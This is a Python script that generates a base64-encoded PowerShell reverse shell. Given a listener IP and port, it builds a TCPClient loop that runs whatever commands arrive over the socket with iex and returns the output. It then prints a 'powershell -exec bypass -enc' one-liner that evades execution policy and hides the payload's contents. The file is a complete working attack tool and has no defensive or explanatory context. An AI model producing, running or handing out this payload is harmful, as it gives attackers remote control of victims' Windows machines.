#!/usr/bin/env python3
import argparse
import base64
import ipaddress


def valid_ip(value: str) -> str:
    try:
        ipaddress.ip_address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {value}") from exc
    return value


def valid_port(value: str) -> int:
    try:
        port = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"Port must be an integer: {value}") from exc
    if not (1 <= port <= 65535):
        raise argparse.ArgumentTypeError("Port must be in range 1..65535")
    return port


def parse_args(argv=None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Build a UTF-16LE/base64 PowerShell reverse-shell payload.")
    parser.add_argument("ip", type=valid_ip, help="Listener IP address.")
    parser.add_argument("port", type=valid_port, help="Listener TCP port.")
    return parser.parse_args(argv)


def build_payload(ip, port: int):
    payload = """
$c = New-Object System.Net.Sockets.TCPClient('{ip}',{port});
$s = $c.GetStream();[byte[]]$b = 0..65535|%{{0}};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
}};
$c.Close()
""".format(ip=ip, port=port)
    return payload


def encode_payload(payload):
    encoded_bytes = payload.encode("utf-16-le")
    b64 = base64.b64encode(encoded_bytes)
    return b64.decode()


def main(argv=None) -> int:
    args = parse_args(argv)
    payload = build_payload(args.ip, args.port)
    encoded = encode_payload(payload)
    print("powershell -exec bypass -enc {}".format(encoded))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
